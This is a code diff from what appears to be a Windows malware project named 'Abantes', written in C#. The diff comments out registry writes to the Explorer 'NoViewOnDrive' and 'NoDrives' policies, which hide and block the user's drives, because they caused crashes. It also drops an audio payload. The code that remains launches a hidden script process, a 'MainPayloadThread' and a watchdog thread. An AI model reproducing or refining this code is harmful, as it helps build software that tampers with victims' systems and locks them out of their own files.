@@ -199,12 +199,12 @@ namespace Abantes
                 editKey.SetValue("MouseTrails", "7");
                 editKey.Close();
 
-                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
-                editKey.SetValue("NoViewOnDrive", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
-                editKey.SetValue("NoDrives", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
-                editKey.Close();
+                //editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");    Causes Crash
+                //editKey.SetValue("NoViewOnDrive", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
+                //editKey.Close();
+                //editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");   Causes CrashW
+                //editKey.SetValue("NoDrives", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
+                //editKey.Close();
 
                 Process ScriptProcess = new Process();
                 ScriptProcess.StartInfo.CreateNoWindow = true;
@@ -238,11 +238,7 @@ namespace Abantes
                 Thread normalThread = new Thread(new ThreadStart(Threads.MainPayloadThread));
                 Thread watchdogThread = new Thread(new ThreadStart(Threads.WatchDogThread));
                 normalThread.Start();
-                watchdogThread.Start();
-                WMPLib.WindowsMediaPlayer Player;
-                Player = new WMPLib.WindowsMediaPlayer();
-                Player.URL = Application.StartupPath + "\\Audio.mp3";
-                Player.controls.play();
+                watchdogThread.Start(); //cuases crshes
             }
         }
     }
